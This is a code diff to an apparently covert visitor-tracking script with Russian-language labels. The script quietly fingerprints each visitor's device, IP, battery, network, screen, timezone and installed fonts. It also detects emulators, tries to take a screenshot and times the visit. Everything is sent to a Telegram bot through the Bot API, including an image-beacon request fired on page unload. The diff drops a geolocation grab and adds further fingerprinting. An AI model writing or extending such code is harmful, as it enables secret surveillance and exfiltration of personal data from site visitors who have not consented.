@@ -92,17 +92,11 @@ function getDeviceInfo() {
   return 'Устройство: ' + navigator.userAgent +
     '\nЯзык: ' + navigator.language +
     '\nЭкран: ' + screen.width + 'x' + screen.height +
-    '\nПлатформа: ' + navigator.platform;
-}
-
-function getGeo() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(pos) {
-      send('📍 Гео: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
-    }, function() {
-      send('📍 Гео: отказ');
-    });
-  }
+    '\nПлатформа: ' + navigator.platform +
+    '\nЯдер: ' + (navigator.hardwareConcurrency || 'н/д') +
+    '\nПамять: ' + (navigator.deviceMemory || 'н/д') + ' GB' +
+    '\nТач: ' + (navigator.maxTouchPoints || 0) +
+    '\nОнлайн: ' + navigator.onLine;
 }
 
 function getIP() {
@@ -122,8 +116,30 @@ function getBattery() {
 
 function getConnection() {
   if (navigator.connection) {
-    send('📶 Сеть: ' + (navigator.connection.effectiveType || 'unknown'));
+    send('📶 Сеть: ' + (navigator.connection.effectiveType || 'unknown') +
+      ' | ' + (navigator.connection.downlink || '?') + ' Mbps');
   }
+}
+
+function getScreenInfo() {
+  send('🖥 Экран: ' + screen.width + 'x' + screen.height +
+    '\nОриентация: ' + (screen.orientation ? screen.orientation.type : 'н/д') +
+    '\nЦвет: ' + screen.colorDepth + ' bit' +
+    '\nDPR: ' + window.devicePixelRatio);
+}
+
+function getTimeZone() {
+  send('🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone +
+    '\nВремя: ' + new Date().toLocaleString('ru-RU'));
+}
+
+function getUserID() {
+  var id = localStorage.getItem('uid');
+  if (!id) {
+    id = Math.random().toString(36).substring(2, 10);
+    localStorage.setItem('uid', id);
+  }
+  return id;
 }
 
 function takeScreenshot() {
@@ -136,20 +152,57 @@ function takeScreenshot() {
   }
 }
 
-function getUserID() {
-  var id = localStorage.getItem('uid');
-  if (!id) {
-    id = Math.random().toString(36).substring(2, 10);
-    localStorage.setItem('uid', id);
+function getFonts() {
+  var fonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Tahoma', 'Trebuchet MS', 'Comic Sans MS', 'Impact', 'Webdings'];
+  var detected = [];
+  var canvas = document.createElement('canvas');
+  var ctx = canvas.getContext('2d');
+  var text = 'mmmmmmmmmmlli';
+  var baseFonts = ['monospace', 'sans-serif', 'serif'];
+  var baseSizes = {};
+  baseFonts.forEach(function(base) {
+    ctx.font = '72px ' + base;
+    baseSizes[base] = ctx.measureText(text).width;
+  });
+  fonts.forEach(function(font) {
+    baseFonts.forEach(function(base) {
+      ctx.font = '72px "' + font + '", ' + base;
+      if (ctx.measureText(text).width !== baseSizes[base]) {
+        if (detected.indexOf(font) === -1) detected.push(font);
+      }
+    });
+  });
+  if (detected.length) send('🔤 Шрифты: ' + detected.join(', '));
+}
+
+function detectEmulator() {
+  var isEmulator = false;
+  if (navigator.userAgent.indexOf('Android') > -1) {
+    if (navigator.userAgent.indexOf('sdk') > -1 || navigator.userAgent.indexOf('Emulator') > -1) {
+      isEmulator = true;
+    }
   }
-  return id;
+  if (isEmulator) send('⚠️ Возможно эмулятор');
+}
+
+function trackTime() {
+  var start = Date.now();
+  window.addEventListener('beforeunload', function() {
+    var sec = Math.round((Date.now() - start) / 1000);
+    var img = new Image();
+    img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent('⏱ Время на сайте: ' + sec + ' сек');
+  });
 }
 
 send('👤 Новый визит ID: ' + getUserID() + '\n' + getDeviceInfo());
-getGeo();
 getIP();
 getBattery();
 getConnection();
+getScreenInfo();
+getTimeZone();
+getFonts();
+detectEmulator();
+trackTime();
 setTimeout(takeScreenshot, 3000);
 
 document.getElementById('next1').addEventListener('click', function() {
